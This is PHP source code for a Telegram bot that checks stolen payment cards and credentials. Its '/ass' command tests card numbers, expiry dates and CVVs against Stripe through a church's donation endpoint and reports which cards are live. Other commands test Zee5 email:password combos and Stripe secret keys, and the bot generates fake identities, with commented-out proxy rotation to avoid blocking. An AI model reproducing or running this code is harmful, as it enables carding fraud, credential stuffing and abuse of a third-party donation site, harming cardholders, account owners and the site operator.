<?php

#----------------- [BOT RAW BY AAMIR] --------------------------#

#------------------[ Version 1.0 ] ------------------------#

$botToken = ""; # ENTER HERE BOT TOKEN
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
#--------------------[Private Command]---------------------# IF YOU NOT WANT THAT COMMAND THEN REMOVE
$mainid = (array("1569782681,1569782681")); #PUT HERE USERID

if (in_array($chatId, $mainid) === false){
 $freeusermsg = urlencode ("Premium Declined!");
 sendMessage($chatId,$freeusermsg, $message_id);
return;
}
#------------------[Start]-------------#
if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<i>Hello $firstname now you can use /cmds%0A%0ABot Made by Aamir </i>");
}
#----------- [ COMMANDS ] --------#
elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<i>BIN: /bin 461046%0AINFO: /info Know Yourself%0ASK CHECK: /sk sk_xyz%0ASTRIPE GATE: /ass cc|mon|yy|cvv%0AZee5 Checker: /zee5 mail:pass%0A%0ABot Made by Aamir </i>");
}
#------------[User Info]---------#
elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<i>YOUR ID: <code>$userId</code>%0AFirst Name: $firstname%0AUsername: @$username%0A%0ABot Made by Aamir </i>");
}
#---------------[BIN CODE]------------------#
elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');

if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 
curl_close($ch);
sendMessage($chatId, '<i>Bin Data ✓</i>%0A%0A<i>Bank: '.$bank.' </i>%0A<i>Country:</i><i> '.$name.''.$emoji.' </i>%0A<i>Brand: '.$brand.' </i>%0A<i>Card: '.$scheme.' </i>%0A<i>Type: '.$type.' </i>%0A<i>Currency: '.$currency.' </i>%0A<i>Checked By: @'.$username.' </i>%0A%0A<i>BOT MADE BY </i><b>@Aamir_2x</b>');
}
curl_close($ch);
#---------------------------[ GATE 1 CHECKER ]-----------------------#

if ((strpos($message, "!ass") === 0)||(strpos($message, "/ass") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
#-----------------------[BIN INFO]--------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);
#----------------[ RANDOM INFO ]----------------#

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$firstname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lastname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];


//

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://rccggraceassembly.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ',
'method: ',
'path: ',
'scheme: https',
'accept: ',
'accept-language: en-US,en;q=0.9',
'content-type: ',
'cookie: ',
'origin: ',
'referer: ',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'');
  $result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

#---------------------------------------------[ RESPONSES ]------------------------------------#
 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> CVV MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> CVV MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> CCN LIVE - Insufficient Funds </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> CCN MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> CCN MATCHED - Card Doesnt Support Purchase </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved</b>%0A<b>Response:</b> <b> Pickup Card 「Reported Stolen Or Lost」 </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Declined : Do_Not_Honor </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Incorrect Card Number </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Expired Card </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Declined : Generic_Decline </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Declined : Generic_Decline </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Dismiss</b>%0A<b>Responce:</b> <b> Card Declined </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Aamir </b>');
}elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}


#----------------[ Zee5 ]------------------#
if (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

if($token){
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<b>EMAIL:PASS</b> <code>$combo</code>%0A<b>Response:</b> <b>Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<i>Bot Made by Aamir</i>");
}else{
sendMessage($chatId, "<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>Wrong Email or Password</b>%0A<b>Checked By:</b> @$username%0A%0A<i>Bot Made by Aamir</i>");
};
curl_close($ch);
ob_flush();
}

#-------------------[Sk Key Check Command]---------------------#

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> EXPIRED KEY%0A%0A<b>Bot Made by Aamir </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> INVALID KEY%0A%0A<b>Bot Made by Aamir </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<i>DEAD KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>REASON:</i> Testmode Charges Only%0A%0A<b>Bot Made by Aamir★ </b>");
}else{
sendMessage($chatId, "<i>LIVE KEY</i>%0A<i>KEY:</i> <code>$sec</code>%0A<i>Message: </i> SK LIVE%0A%0A<b>Bot Made by Aamir </b>");
}}

#----------------------------------------------#
function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

#------- VERSION 1.0
#------- GITHUB 
#------- POWERED BY MAKEPOSSIBLEX

#------------------------------------------------------ BOT RAW MADE BY AAMIR -----------------------------------------------#

?>